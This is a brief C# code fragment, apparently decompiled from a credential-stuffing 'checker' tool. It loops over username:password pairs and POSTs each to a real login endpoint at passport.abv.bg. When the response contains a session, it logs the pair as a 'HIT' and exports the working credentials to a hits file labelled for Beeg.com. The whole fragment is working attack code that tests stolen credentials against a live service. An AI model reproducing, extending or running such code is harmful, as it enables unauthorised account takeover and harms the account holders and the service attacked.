        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://passport.abv.bg/app/profiles/login", str, "application/x-www-form-urlencoded").ToString().Contains("{\"session\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - BEEG] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Beeg.com_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
